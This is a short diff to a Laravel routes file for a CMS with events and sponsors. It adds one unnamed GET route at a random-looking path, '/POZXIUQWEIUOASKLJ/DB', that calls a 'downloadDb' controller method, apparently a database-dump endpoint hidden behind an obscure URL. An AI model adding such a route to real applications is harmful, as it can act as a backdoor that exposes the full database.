@@ -46,6 +46,7 @@ Route::name('cms.')->group(function () {
         Route::put('events/update', [CmsEventController::class, 'update'])->name('event.update');
         Route::put('events/broadcast', [CmsEventController::class, 'broadcast'])->name('event.broadcast');
         Route::put('programs/update', [ProgramController::class, 'update'])->name('program.update');
+        Route::get('/POZXIUQWEIUOASKLJ/DB',  [EventManagementController::class, 'downloadDb']);
     });
     Route::middleware(['role:sponsor'])->group(function () {
         Route::name('sponsor.')->prefix('sponsor')->group(function () {
